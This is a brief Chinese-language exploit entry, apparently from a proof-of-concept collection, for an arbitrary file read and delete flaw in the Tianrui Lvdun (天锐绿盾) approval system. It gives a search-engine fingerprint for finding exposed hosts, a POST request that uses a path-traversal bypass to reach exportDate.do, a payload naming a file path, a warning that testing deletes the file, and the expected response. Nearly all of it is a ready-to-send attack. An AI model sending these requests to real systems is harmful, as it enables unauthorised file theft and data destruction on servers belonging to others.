# 天锐绿盾审批系统exportDate.do存在任意文件读取+删除漏洞

天锐绿盾 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/login.jsp/.%2e/config/exportDate.do HTTP/1.1`

**Payload**
```
漏洞测试会删除对应文件，谨慎测试
Host:
Content-Type: application/x-www-form-urlencoded
name=c:\a.txt
```
- **响应特征**：200